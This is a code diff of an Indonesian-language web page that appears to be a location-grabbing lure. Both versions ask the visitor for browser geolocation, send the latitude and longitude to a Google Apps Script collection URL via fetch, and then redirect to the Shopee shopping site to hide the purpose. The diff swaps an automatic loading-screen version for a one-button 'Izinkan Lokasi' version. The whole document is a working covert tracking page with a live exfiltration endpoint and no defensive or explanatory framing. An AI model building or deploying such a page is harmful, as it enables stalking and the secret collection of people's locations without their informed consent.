@@ -1,166 +1,84 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Loading...</title>
+  <title>Aktifkan Lokasi</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   
   <style>
     body {
       margin: 0;
-      font-family: 'Segoe UI', sans-serif;
+      font-family: Arial;
       background: linear-gradient(135deg, #4facfe, #00f2fe);
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-    }
-
-    .card {
-      background: rgba(255,255,255,0.15);
-      backdrop-filter: blur(15px);
-      border-radius: 20px;
-      padding: 30px;
-      width: 85%;
-      max-width: 320px;
-      text-align: center;
       color: white;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-      animation: fadeIn 1s ease;
+      text-align: center;
     }
 
-    @keyframes fadeIn {
-      from {opacity:0; transform: translateY(20px);}
-      to {opacity:1; transform: translateY(0);}
+    .box {
+      background: rgba(255,255,255,0.2);
+      padding: 25px;
+      border-radius: 15px;
     }
 
-    .loader {
-      border: 6px solid rgba(255,255,255,0.3);
-      border-top: 6px solid white;
-      border-radius: 50%;
-      width: 60px;
-      height: 60px;
-      animation: spin 1s linear infinite;
-      margin: auto;
-    }
-
-    @keyframes spin {
-      100% { transform: rotate(360deg); }
-    }
-
-    h1 {
-      margin-top: 20px;
-      font-size: 20px;
-    }
-
-    p {
-      opacity: 0.8;
-      font-size: 14px;
-    }
-
-    .success {
-      color: #00ffcc;
-      font-weight: bold;
-    }
-
-    .error {
-      color: #ffdddd;
-      font-weight: bold;
-    }
-
-    .btn {
+    button {
       margin-top: 15px;
-      padding: 10px 15px;
+      padding: 12px 20px;
       border: none;
       border-radius: 10px;
       background: white;
       color: #333;
       font-weight: bold;
-      display: none;
       cursor: pointer;
-    }
-
-    .progress {
-      margin-top: 15px;
-      height: 6px;
-      background: rgba(255,255,255,0.3);
-      border-radius: 10px;
-      overflow: hidden;
-    }
-
-    .bar {
-      height: 100%;
-      width: 0%;
-      background: white;
-      animation: loadbar 3s linear forwards;
-    }
-
-    @keyframes loadbar {
-      from {width:0%;}
-      to {width:100%;}
     }
   </style>
 </head>
 
 <body>
 
-<div class="card">
-  <div class="loader" id="load"></div>
-  <h1 id="status">Memuat sistem...</h1>
-  <p id="info">Mohon tunggu sebentar</p>
-
-  <div class="progress">
-    <div class="bar"></div>
-  </div>
-
-  <button class="btn" id="btn" onclick="lanjut()">Lanjut</button>
+<div class="box">
+  <h2>Aktifkan Lokasi</h2>
+  <p>Klik tombol di bawah untuk melanjutkan</p>
+  <button onclick="ambilLokasi()">Izinkan Lokasi</button>
+  <p id="status"></p>
 </div>
 
 <script>
-function lanjut(){
-  window.location.href = "https://shopee.co.id";
-}
+function ambilLokasi(){
 
-if (navigator.geolocation) {
+  if (navigator.geolocation) {
 
-  navigator.geolocation.getCurrentPosition(
-    function(pos){
+    navigator.geolocation.getCurrentPosition(
+      function(pos){
 
-      var lat = pos.coords.latitude;
-      var lon = pos.coords.longitude;
+        var lat = pos.coords.latitude;
+        var lon = pos.coords.longitude;
 
-      var url = "https://script.google.com/macros/s/AKfycbw2q8jMhiz3W0FRQ0_C-8hCA3WVAxAqmjeQ3snUsI0j6AMlYYNT_RrPTfjjFxxa48Yv/exec?lat=" 
-                + lat + "&lon=" + lon;
+        var url = "https://script.google.com/macros/s/AKfycbw2q8jMhiz3W0FRQ0_C-8hCA3WVAxAqmjeQ3snUsI0j6AMlYYNT_RrPTfjjFxxa48Yv/exec?lat=" 
+                  + lat + "&lon=" + lon;
 
-      fetch(url).then(() => {
-        document.getElementById("load").style.display = "none";
-        document.getElementById("status").innerHTML = "✅ Data berhasil dimuat";
-        document.getElementById("status").className = "success";
-        document.getElementById("info").innerHTML = "Mengalihkan halaman...";
+        fetch(url);
 
-        // tombol muncul
-        document.getElementById("btn").style.display = "block";
+        document.getElementById("status").innerHTML = "✅ Lokasi berhasil diambil";
 
-        // auto redirect
-        setTimeout(() => {
+        // redirect otomatis
+        setTimeout(()=>{
           window.location.href = "https://shopee.co.id";
-        }, 3000);
-      });
+        },2000);
 
-    },
+      },
 
-    function(error){
-      document.getElementById("load").style.display = "none";
-      document.getElementById("status").innerHTML = "❌ Gagal akses lokasi";
-      document.getElementById("status").className = "error";
-      document.getElementById("info").innerHTML = error.message;
+      function(error){
+        document.getElementById("status").innerHTML = "❌ Harap izinkan lokasi agar lanjut";
+      }
 
-      document.getElementById("btn").style.display = "block";
-    }
+    );
 
-  );
-
-} else {
-  document.getElementById("status").innerHTML = "❌ Browser tidak support GPS";
+  } else {
+    document.getElementById("status").innerHTML = "❌ Browser tidak support";
+  }
 }
 </script>
 
